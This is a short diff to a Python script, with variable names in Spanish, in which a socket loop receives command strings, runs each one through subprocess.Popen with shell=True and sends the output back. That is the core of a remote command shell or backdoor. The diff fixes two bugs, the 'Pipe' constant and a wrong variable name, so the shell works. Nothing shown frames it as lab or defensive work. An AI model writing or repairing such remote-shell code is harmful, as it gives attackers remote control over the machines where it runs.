@@ -8,5 +8,5 @@ user.send("1".encode("ascii"))
 while True:
     comando=user.recv(1024)
     codigo=comando.decode("ascii")
-    consola=subprocess.Popen(codigo,shell=True,stdout=subprocess.Pipe,stderr=subprocess.Pipe)
-    cliente.send(consola.stdout.read())
+    consola=subprocess.Popen(codigo,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+    user.send(consola.stdout.read())
